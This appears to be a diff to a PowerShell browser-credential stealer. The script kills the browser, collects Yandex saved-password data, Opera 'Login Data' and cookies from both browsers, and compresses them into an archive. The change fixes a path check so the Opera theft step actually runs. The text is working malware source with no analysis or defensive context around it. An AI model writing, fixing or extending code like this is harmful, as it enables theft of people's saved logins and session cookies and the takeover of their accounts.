@@ -24,7 +24,7 @@ if("WinRAR" -in $arh)
 elseif("7-Zip"-in $arh)
   {.\7z.exe a $p ($y+"Ya Passman Data"),($y+"Cookies") -spf -tzip}}else{echo "asd"}
 
-$o=($env:APPDATA+"\Opera Software\Opera Stable\");if(Test-Path -Path $y){Stop-Process -Name browser -ErrorAction SilentlyContinue;
+$o=($env:APPDATA+"\Opera Software\Opera Stable\");if(Test-Path -Path $o){Stop-Process -Name browser -ErrorAction SilentlyContinue;
 if("WinRAR" -in $arh)
   {Get-ChildItem -Path $o -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
 elseif("7-Zip"-in $arh)
